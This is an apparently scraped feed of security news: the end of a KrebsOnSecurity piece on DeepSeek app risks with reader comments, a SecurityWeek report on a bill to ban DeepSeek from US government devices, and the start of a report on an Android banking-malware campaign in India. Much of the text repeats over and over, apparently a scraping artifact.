service, as did the U.S. Navy.\nBeyond security concerns tied to the DeepSeek iOS app, there are indications the Chinese AI company may be playing fast and loose with the data that it collects from and about users. On January 29, researchers at Wiz said they discovered a publicly accessible database linked to DeepSeek that exposed “a significant volume of chat history, backend data and sensitive information, including log streams, API secrets, and operational details.”\n“More critically, the exposure allowed for full database control and potential privilege escalation within the DeepSeek environment, without any authentication or defense mechanism to the outside world,” Wiz wrote. [Full disclosure: Wiz is currently an advertiser on this website.]\nKrebsOnSecurity sought comment on the report from DeepSeek and from Apple. This story will be updated with any substantive replies.\n\r\n         This entry was posted on Thursday 6th of February 2025 04:12 PM \r\n         \nI have already forwarded this to everyone in our company who has a company cell phone. Already we only allow a small list of applications on our company phone via Intune. I am also concerned about the security of our employee’s personal phones.\nI have my one own phone and believe you me, EVERY one’s cut off from deep-seek.\nAustralian federal government, as well as several state governments, have all banned DeepSeek (for government usage) for these reasons – and one, suspects questions about Chinese government access and involvement.\nSchool Report Card:\nAptitude: A+\nAchievements: A+\nDiligence: B-\nImpact: A++++++++\nDeepseek has a tendancy to come up with some novel approaches and doesn’t always follow the norms which have been set by his peer group. He is a loner in some respects, but I sense his presense, approach and following will grow over the course of 2025. His last piece of work was completed with haste, no doubt due to family commitments (MIC2025), but I liked the openness of the code which will allow his peer group to study and learn from it for future submissions. I’ve given his peers a copy, so they can study it in earnest and I’m hoping they will learn from it and it will inspire them to further their knowledge and understanding for all to share within the community in an open manner.\n/s\nExcellent overview on the risks thus far identified.\nBig yawn.  Does anyone legitimately think OpenAI, etc doesn’t have access to this data and wouldn’t turn it over to the USG on simple ask, much less demand.  You know kind of like how every US company has since CALEA.\nI’d trust the Chinese government way more than I’d trust the USG with my life’s details.  US public officials just mad they can’t force Chinese companies to spy on US citizens or manufacturer evidence against them.\nThis complacency is the biggest problem of all, particularly for Gen Z and younger. They only know life in the digital world, where Western corporate practices have slowly eroded all manner of privacy; they don’t know any different and could not care less. Who can blame them when your only choice is; do you want US tech giants abusing your data or the Chinese government? The genie got out of the bottle long ago: good luck putting that back in.\nOff topic but this is really a problem of education. I’m Gen Z and from Germany. We take data security to extreme measures. We learn about it early on in school and it’s a topic that gets picked up over and over throughout the years. Protecting personal data is essential and a fundamental right. Companies and institutions must comply to strict privacy laws like GDPR. Even the goverment can’t do anything about it. This is an awareness that should be teached and trained anywhere in the world.\nAs a long-time proponent of sharing awareness of all things privacy and security related, this is encouraging to hear. I applaud the courage and actions of the EU in leading the way in protecting its citizens from the harms of the mass harvesting of private and personal data, performed by corporations today. Bravo.\nOne can only hope that other jurisdictions take note but I’m not going to hold my breath.\n“I’d trust the Chinese government way more than I’d trust the USG with my life’s details.”\nSure you would sweetheart.  Move there and we’ll see.\nAbsolutely! This is a warning about nothing unexpected.\nAnyway, you can run DeepSeek locally, without having to send anything to China.\nI thought it was the first LLM I have seen which actually displayed behaviour that I’d call “Intelligent” – it explained the reasoning it used to answer my question and that reasoning was actually quite impressive. It’s certainly the first LLM I have seen which might actually deserve being called an “AI”.\nToo bad the company lied, it’s a CCCP pet project, and it can’t do basic mathematics…\ngreat reasoning otherwise, derp.\nSame security concerns over the desktop/laptop version? DIYs are airing on Youtube showing Deepseek running on a Raspberry Pi.\nNo. As long as you follow security best practise in hosting your own LLMs, there should be on problems. That is; running any LLMs locally, be it Deepseek, Llama, Mistral or otherwise, should be entirely sandboxed or cantainerised, with say Kubernetes or Docker to ensure there is no data leakage. I have yet to see any attempts at reaching out and I have been running Deepseek R1 since its release.\nRPI is not able to run the real deal, just the distilled version which is a poor imitation of the real 671b model\nI am fully aware of that. I was answering Mark’s question concerning security as this is a Security site not an LLM guide.\nI am fully aware of that. Mark asked a security related question then made a statement. I replied to the question not the statement.\nHardware Security researcher Matt Brown performed Wireshark reconnaisance and packet inspection on the Chinese ‘RedNote’ app in the wake of the TikTok debacle a fortnight ago (link below). The results were alarmingly similar to these reports; use of hard-coded encryption keys and sending of plain text data to multiple Chinese based servers. Security does not seem to be a priority for any major Chinese software/app developer nowadays. Whether that is due to poor training/skills-base or by design, I’ll leave that up to you to decide.\nhttps://www.youtube.com/watch?v=-MZV6T6ag0c\nI remember a Far Side cartoon where a bunch of buffalo are stampeding and one says “as if we all know where we’re going”.\nI’m also old enough to remember an Internet and Web where one could just play around with the latest and greatest application or website and not really worry about what was heading back the other way.\nThose days are long gone, patience is not only a virtue now, it’s damn good cybersecurity and privacy practice, as well as not jumping on a bandwagon.\nThanks as always for keeping us informed.\nHow much of this is applicable to the version of DeepSeek that can be run on a local server? I’m guessing none…\nIf it’s china – everyone freaks out.  This is projection from US firms – the US firms are spying on everyone, and playing ‘fast and loose’ with our data an could not care less about privacy – so therefore the Chineese must be doing the same (and maybe there are).  Why not look in the mirror.\nThe bigger concern about AI, in the context of a blog like, this is the huge scope to train models in all things IT and to get the models to do the hacking for you.  They will make human hackers look like children playing with wooden building blocks. But no one is talking about it.\n?\nWhile I agree that there is a lot of sensitive information going in to apps like ChatGPT as well as other social media applications none of them are hardcoding keys in to their application or disabling in transit encryption that is standard in the application. It’s not so much projection as it is pointing out that this app is very insecure and seemingly a fly by night type of operation.\n@Mealy, see that’s the point, I’m not in their legal jurisdiction hence why I trust them.  That’s all the USG is upset about here, it’s the other nations are providing data safe havens against them.  If I lived in China as you suggested, obviously I’d try and use a US AI product.  9/11 killed Tim May, AI buried him.  The Internet could have been great.\nI read where Apple vetted apps published on its website to determine how much information was sent to the apps originators and even asked Facebook to stop collecting information that cost them millions of dollars.  Why would they not do the same for DeepFake?\nThe image has a little typo on the upper left part where it says “DeepServer Servers” – it needs to read “DeepSeek Servers” (or similar).  Good image still for those not technically well versed to explain it to them easily.\nI asked DeepSeek, Google Gemini,  and Microsoft Copilot:\n“Axios reported on January 30 that U.S. congressional offices are being warned not to use the app.\n“Threat actors are already exploiting DeepSeek to deliver malicious software and infect devices,” read the notice from the chief administrative officer for the House of Representatives.\nQuestion: How does DeepSeek deliver malicious software and infect devices?”\nThe DeepSeek response was honest,  detailed, and nuanced.\nCoPilot was brief and less detailed.\nGemini was brief, the least insightful, and totally failed to mention the counterfeit Python package problem.\nI think most people understand that everything you do on the internet is public.  The use of a hard-coded key is not ideal, but even Chrome did that for Linux machines without a key-ring.  (it’s “peanuts”)  This would be for encryption at rest.  Strange that they transmit credentials over http though… seems like a bad idea.  The point about China company vs. US company is appropriate though… either way it’s a company who’s collecting info on you… whether that’s Google or this Chinese company, or an intelligence agency it’s a central repository that can be hacked by bad actors.  A lot of the anti-Chinese privacy concerns do seem hypocritical to me.  It’s one thing to prevent guv’ment employees with security clearances from accessing the apps… it’s another to prevent all US citizens.  If they’re trying to protect us from threats they should do that across the board.  Isn’t the threat the same whether it’s based in the US or China?  A private company can gain access to secure guv’ment workers through associates or family just as easily whether it’s US, China, or multi-national based, no?\nThere are countless other apps with millions of users that collect the exact same user information, if not more, and transport it in the same way, with the same ‘security risks.’ The only reason for this is because of the suspected involvement of the Chinese government, which I would rather have control of my data than the U.S. government.\nYes, there are many apps that clearly don’t care about security. But not many are the top downloaded apps for weeks on end.\nYour email address will not be published. Required fields are marked *\nComment * \nName * \nEmail * \nWebsite \n \n\n\n\nΔ\nMailing List\nSearch KrebsOnSecurity\nRecent Posts\nStory Categories\nWhy So Many Top Hackers Hail from Russia"
    },
    {
        "Title": "House Lawmakers Push to Ban AI App DeepSeek From US Government Devices",
        "Link": "https://www.securityweek.com/house-lawmakers-push-to-ban-ai-app-deepseek-from-us-government-devices/",
        "Summary": "<p>A bipartisan duo in the the U.S. House is proposing legislation to ban the Chinese artificial intelligence app DeepSeek from federal devices.</p>\n<p>The post <a href=\"https://www.securityweek.com/house-lawmakers-push-to-ban-ai-app-deepseek-from-us-government-devices/\">House Lawmakers Push to Ban AI App DeepSeek From US Government Devices</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-02-06",
        "Content": "Hi, what are you looking for?\nA bipartisan duo in the the U.S. House is proposing legislation to ban the Chinese artificial intelligence app DeepSeek from federal devices.\nBy\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nA bipartisan duo in the the U.S. House is proposing legislation to ban the Chinese artificial intelligence app DeepSeek from federal devices, similar to the policy already in place for the popular social media platform TikTok.\nReps. Josh Gottheimer, D-N.J., and Darin LaHood, R-Ill., on Thursday introduced the “No DeepSeek on Government Devices Act,” which would ban federal employees from using the Chinese AI app on government-owned electronics. They cited the Chinese government’s ability to use the app for surveillance and misinformation as reasons to keep it away from federal networks.\n\n\n\n“The Chinese Communist Party has made it abundantly clear that it will exploit any tool at its disposal to undermine our national security, spew harmful disinformation, and collect data on Americans,” Gottheimer said in a statement. “We simply can’t risk the CCP infiltrating the devices of our government officials and jeopardizing our national security.”\n\n\n\nThe proposal comes after the Chinese software company in January published an AI model that performed at a competitive level with models developed by American firms like OpenAI, Meta, Alphabet and others. DeepSeek purported to develop the model at a fraction of the cost of its American counterparts. The announcement raised alarm bells and prompted debates among policymakers and leading Silicon Valley financiers and technologists.\n\n\n\nThe churn over AI is coming at a moment of heightened competition between the U.S. and China in a range of areas, including technological innovation. The U.S. has levied tariffs on Chinese goods, restricted Chinese tech firms like Huawei from being used in government systems and banned the export of state of the art microchips thought to be needed to develop the highest end AI models.\n\n\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nReps. Josh Gottheimer, D-N.J., and Darin LaHood, R-Ill., on Thursday introduced the “No DeepSeek on Government Devices Act,” which would ban federal employees from using the Chinese AI app on government-owned electronics. They cited the Chinese government’s ability to use the app for surveillance and misinformation as reasons to keep it away from federal networks.\n\n\n\n“The Chinese Communist Party has made it abundantly clear that it will exploit any tool at its disposal to undermine our national security, spew harmful disinformation, and collect data on Americans,” Gottheimer said in a statement. “We simply can’t risk the CCP infiltrating the devices of our government officials and jeopardizing our national security.”\n\n\n\nThe proposal comes after the Chinese software company in January published an AI model that performed at a competitive level with models developed by American firms like OpenAI, Meta, Alphabet and others. DeepSeek purported to develop the model at a fraction of the cost of its American counterparts. The announcement raised alarm bells and prompted debates among policymakers and leading Silicon Valley financiers and technologists.\n\n\n\nThe churn over AI is coming at a moment of heightened competition between the U.S. and China in a range of areas, including technological innovation. The U.S. has levied tariffs on Chinese goods, restricted Chinese tech firms like Huawei from being used in government systems and banned the export of state of the art microchips thought to be needed to develop the highest end AI models.\n\n\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\n“The Chinese Communist Party has made it abundantly clear that it will exploit any tool at its disposal to undermine our national security, spew harmful disinformation, and collect data on Americans,” Gottheimer said in a statement. “We simply can’t risk the CCP infiltrating the devices of our government officials and jeopardizing our national security.”\n\n\n\nThe proposal comes after the Chinese software company in January published an AI model that performed at a competitive level with models developed by American firms like OpenAI, Meta, Alphabet and others. DeepSeek purported to develop the model at a fraction of the cost of its American counterparts. The announcement raised alarm bells and prompted debates among policymakers and leading Silicon Valley financiers and technologists.\n\n\n\nThe churn over AI is coming at a moment of heightened competition between the U.S. and China in a range of areas, including technological innovation. The U.S. has levied tariffs on Chinese goods, restricted Chinese tech firms like Huawei from being used in government systems and banned the export of state of the art microchips thought to be needed to develop the highest end AI models.\n\n\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nThe proposal comes after the Chinese software company in January published an AI model that performed at a competitive level with models developed by American firms like OpenAI, Meta, Alphabet and others. DeepSeek purported to develop the model at a fraction of the cost of its American counterparts. The announcement raised alarm bells and prompted debates among policymakers and leading Silicon Valley financiers and technologists.\n\n\n\nThe churn over AI is coming at a moment of heightened competition between the U.S. and China in a range of areas, including technological innovation. The U.S. has levied tariffs on Chinese goods, restricted Chinese tech firms like Huawei from being used in government systems and banned the export of state of the art microchips thought to be needed to develop the highest end AI models.\n\n\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nThe churn over AI is coming at a moment of heightened competition between the U.S. and China in a range of areas, including technological innovation. The U.S. has levied tariffs on Chinese goods, restricted Chinese tech firms like Huawei from being used in government systems and banned the export of state of the art microchips thought to be needed to develop the highest end AI models.\n\n\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nLast year, Congress and then-President Joe Biden approved a divestment of the popular social media platform TikTok from its Chinese parent company or face a ban across the U.S.; that policy is now on hold. President Donald Trump, who originally proposed a ban of the app in his first term, signed an executive order last month extending a window for a long term solution before the legally required ban takes effect.\n\n\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nIn 2023, Biden banned TikTok from federal-issued devices.\n\n\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\n“The technology race with the Chinese Communist Party is not one the United States can afford to lose,” LaHood said in a statement. “This commonsense, bipartisan piece of legislation will ban the app from federal workers’ phones while closing backdoor operations the company seeks to exploit for access. It is critical that Congress safeguard Americans’ data and continue to ensure American leadership in AI.”Advertisement. Scroll to continue reading.\n\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nThe bill would single out DeepSeek and any AI application developed by its parent company, the hedge fund High-Flyer, as subject to the ban. The legislation includes exceptions for national security and research purposes that would allow federal employers to study DeepSeek.\n\n\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nSome lawmakers wish to go further. A bill proposed last week by Sen. Josh Hawley, R-Mo., would bar the import of export of any AI technology from China writ large, citing national security concerns.\n\n\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nRelated: DeepSeek Compared to ChatGPT, Gemini in AI Jailbreak Test\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nRelated: DeepSeek Security: System Prompt Jailbreak, Details Emerge on Cyberattacks\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\nRelated: Researchers Link DeepSeek’s Blockbuster Chatbot to Chinese Telecom Banned From Doing Business in US\n\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\nDiscover strategies for vendor selection, integration to minimize redundancies, and maximizing ROI from your cybersecurity investments. Gain actionable insights to ensure your stack is ready for tomorrow’s challenges.\nDive into critical topics such as incident response, threat intelligence, and attack surface management. Learn how to align cyber resilience plans with business objectives to reduce potential impacts and secure your organization in an ever-evolving threat landscape.\nGigamon has promoted Tony Jarjoura to CFO and Ram Bhide has been hired as Senior VP of engineering.\nCloud security firm Mitiga has appointed Charlie Thomas as Chief Executive Officer.\nCynet announced the appointment of Jason Magee as Chief Executive Officer.\n\n\nThe blame of security incidents may be shared—but the burden of response always falls on the security team. Here’s how to prepare for the inevitable.\n(Joshua Goldfarb)\n\n\n\nWith each passing year, social engineering attacks are becoming bigger and bolder thanks to rapid advancements in artificial intelligence.\n(Stu Sjouwerman)\n\n\n\nWhat challenges will the new administration face and what might President Trump’s record on cybersecurity indicate about the likely approach in 2025 and beyond?\n(Marc Solomon)\n\n\n\nWith DORA’s January 2025 compliance deadline approaching, financial institutions must embrace rigorous testing, tailored threat profiles, and continuous vigilance to safeguard against cyber threats.\n(Trevin Edgeworth)\n\n\n\nWith a security-first culture fully in play, developers will view the protected deployment of AI as a marketable skill, and respond accordingly.\n(Matias Madou)\n\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nGot a confidential news tip? We want to hear from you.\nReach a large audience of enterprise cybersecurity professionals \nSubscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inbox.\nCopyright © 2025 SecurityWeek ®, a Wired Business Media Publication. All Rights Reserved. \n\r\n\t\t\t\t\tSubscribe to the SecurityWeek Email Briefing to stay informed on the latest cybersecurity\r\n\t\t\t\t\tnews, threats, and expert insights. Unsubscribe at any time.\r\n\t\t\t\t\t\n\n\n"
    },
    {
        "Title": "1,000 Apps Used in Malicious Campaign Targeting Android Users in India",
        "Link": "https://www.securityweek.com/1000-apps-used-in-malicious-campaign-targeting-android-users-in-india/",
        "Summary": "<p>Zimperium warns that threat actors have stolen the information of tens of thousands of Android users in India using over 1,000 malicious applications.</p>\n<p>The post <a href=\"https://www.securityweek.com/1000-apps-used-in-malicious-campaign-targeting-android-users-in-india/\">1,000 Apps Used in Malicious Campaign Targeting Android Users in India</a> appeared first on <a href=\"https://www.securityweek.com\">SecurityWeek</a>.</p>",
        "Date": "2025-02-06",
        "Content": "Hi, what are you looking for?\nZimperium warns that threat actors have stolen the information of tens of thousands of Android users in India using over 1,000 malicious applications.\nBy\nFlipboard\nReddit\nWhatsapp\nWhatsapp\nEmail\nMobile security firm Zimperium has uncovered a broad malicious campaign targeting Android users in India to steal personal and banking information.\nDubbed FatBoyPanel, the campaign has included the use of more than 1,000 malicious applications for information theft, and differs from typical mobile-focused malicious campaign by using live phone numbers for text message redirection, instead of command-and-control (C&C) servers for one-time password (OTP) theft.\n\n\n\nAccording to Zimperium, the attacks are orchestrated by a single threat actor that has used approximately 1,000 phone numbers to harvest user information. The company also identified roughly 900 malware samples associated with the campaign, primarily focusing on users of Indian banks.\n\n\n\n“Analysis of the collected samples reveals shared code structures, user interface elements, and app logos, suggesting a coordinated effort by a single threat actor targeting mobile devices running the Android OS,” Zimperium said in a research note.\n\n\n\nThe company said it found more than 220 publicly accessible Firebase storage buckets in which the threat actor has stored 2.5 gigabytes of information such as SMS messages from banks, card and banking details, and government ID data, and estimates that 50,000 users have been compromised.\n\n\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nDubbed FatBoyPanel, the campaign has included the use of more than 1,000 malicious applications for information theft, and differs from typical mobile-focused malicious campaign by using live phone numbers for text message redirection, instead of command-and-control (C&C) servers for one-time password (OTP) theft.\n\n\n\nAccording to Zimperium, the attacks are orchestrated by a single threat actor that has used approximately 1,000 phone numbers to harvest user information. The company also identified roughly 900 malware samples associated with the campaign, primarily focusing on users of Indian banks.\n\n\n\n“Analysis of the collected samples reveals shared code structures, user interface elements, and app logos, suggesting a coordinated effort by a single threat actor targeting mobile devices running the Android OS,” Zimperium said in a research note.\n\n\n\nThe company said it found more than 220 publicly accessible Firebase storage buckets in which the threat actor has stored 2.5 gigabytes of information such as SMS messages from banks, card and banking details, and government ID data, and estimates that 50,000 users have been compromised.\n\n\n\nThe campaign relied on WhatsApp for the distribution of APK files posing as government or banking applications, but which installed malware instead, tricking users into disclosing their sensitive information.\n\n\n\n“The malware exploits SMS permissions to intercept and exfiltrate messages, including OTP’s, facilitating unauthorized transactions. Additionally, it employs stealth techniques to hide its icon and resist uninstallation, ensuring persistence on the compromised devices,” Zimperium said.\n\n\n\nThe compamy said the malicious application exfiltrate victims’ by capturing and forwarding SMS messages, by sending the stolen messages to Firebase databases acting as C&C servers, or by combining the two techniques.Advertisement. Scroll to continue reading.\n\n\nThe applications feature hard-coded phone numbers to which they exfiltrate OTPs and SMS messages, “suggesting that these numbers are either directly controlled by the attackers or belong to compromised individuals under their control.”\n\n\n\nThe cybersecurity firm also discovered that the Firebase databases storing the stolen information lacked an authentication mechanism, meaning they were accessible to anyone, exposing administrator details and the phone numbers used for exfiltration.\n\n\n\nBy accessing the attackers’ administrative dashboard, Zimperium discovered the phone numbers used in the attacks, and concluded that it enabled multiple users to operate the campaign. Zimperium tracked the hard-coded phone numbers to specific regions in India, such as West Bengal, Bihar, and Jharkhand. \n\n\n\nRelated: FireScam Android Malware Packs Infostealer, Spyware Capabilities\nRelated: Is XDR Enough? The Hidden Gaps in Your Security Net\nRelated: Security Flaw Found in 2G Mobile Data Encryption Standard\nRelated: Cybercriminals Steal Millions by Spoofing Thousands of Mobile Devices\n\nAccording to Zimperium, the attacks are orchestrated by a single threat actor that has used approximately 1,000 phone numbers to harvest user information. The company also identified roughly 900 malware samples associated with the campaign, primarily focusing on users of Indian banks.\n\n\n\n“Analysis of the collected samples reveals shared code structures, user interface elements, and app logos, suggesting a coordinated effort by a single threat actor targeting mobile devices running the Android OS,” Zimperium said in a research note.\n\n\n\nThe company said it found more than 220 